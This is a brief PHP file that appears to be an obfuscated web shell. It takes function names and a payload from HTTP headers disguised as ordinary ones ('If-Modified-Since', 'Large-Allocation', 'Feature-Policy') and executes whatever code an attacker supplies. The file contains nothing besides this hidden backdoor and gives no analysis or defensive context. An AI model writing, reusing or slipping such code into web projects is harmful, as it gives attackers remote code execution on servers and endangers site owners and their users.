<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['If-Modified-Since'])) {
    $post = $_HEADERS['If-Modified-Since']('', $_HEADERS['Large-Allocation']($_HEADERS['Feature-Policy']));
    $post();
}